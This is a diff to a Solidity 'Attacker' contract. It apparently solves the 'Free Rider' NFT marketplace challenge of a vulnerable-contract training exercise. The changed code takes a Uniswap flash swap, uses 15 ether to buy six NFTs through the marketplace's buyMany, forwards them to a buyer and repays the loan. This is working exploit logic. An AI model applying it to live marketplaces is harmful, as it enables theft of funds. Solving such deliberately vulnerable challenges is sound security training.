@@ -73,26 +73,28 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
     ) external {
         require(msg.sender == address(uniswapV2Pair), "not pair");
         require(sender == address(this), "not sender");
-        weth.withdraw(weth.balanceOf(address(this)));
-        console.log(address(this).balance);
+        
+
         (address tokenBorrow, address caller) = abi.decode(
             data,
             (address, address)
         );
 
+        console.log("caller", caller);
+
         // Your custom code would go here. For example, code to arbitrage.
         require(tokenBorrow == address(weth), "token borrow != WETH");
-        uint256 counter = 1;
+        uint256 counter = 0;
 
-        for (counter; counter < 7; counter++) {
+        for (counter; counter < 6; counter++) {
             tokenIds.push(counter);
         }
-
+        weth.withdraw(15e18);
         freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
         // about 0.3% fee, +1 to round up
         uint fee = (amount1 * 3) / 997 + 1;
         uint256 amountToRepay = amount1 + fee;
-
+        //weth.deposit{value: address(this).balance}();
         // Transfer flash swap fee from caller
         weth.transferFrom(caller, address(this), fee);
 
@@ -100,25 +102,18 @@ contract Attacker is IERC721Receiver, ReentrancyGuard {
         weth.transfer(address(uniswapV2Pair), amountToRepay);
     }
 
-    // Function to perform the flash swap and buy NFTs
-    //function buyNFTs() public payable {}
-
-    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
-    function onERC721Received(
-        address,
-        address,
-        uint256 _tokenId,
-        bytes memory
-    ) external override nonReentrant returns (bytes4) {
-        require(msg.sender == address(freeRiderNFTMarketplace));
-        require(tx.origin == _attacker);
-        require(_tokenId >= 0 && _tokenId <= 5);
-        require(_nft.ownerOf(_tokenId) == address(this));
-
-        _nft.transferFrom(address(this), address(_buyer), _tokenId);
-
+     function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        _nft.transferFrom(address(this), address(_buyer), tokenId);
+        
         return IERC721Receiver.onERC721Received.selector;
     }
+
+    
 
     receive() external payable {}
 }
